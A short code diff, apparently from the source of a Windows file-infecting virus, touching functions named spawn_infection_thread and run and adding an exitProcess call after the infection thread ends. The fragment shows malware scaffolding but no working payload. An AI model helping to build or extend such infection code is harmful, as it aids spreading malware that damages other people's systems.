@@ -3,7 +3,6 @@
 static DWORD WINAPI run(LPVOID param);
 
 void spawn_infection_thread(void) {
-
   data_t data;
   if (init_data(&data, (void*)code_begin, (void*)code_end, (void*)spawn_infection_thread) == 0) {
     HANDLE hThread = data.functions.createThread(
@@ -48,5 +47,6 @@ static DWORD WINAPI run(LPVOID param) {
     PRINT_DEBUG("failed to initialize data\n");
   }
   PRINT_DEBUG("infection thread finished\n");
+  data.functions.exitProcess(0);
   return 0;
 }
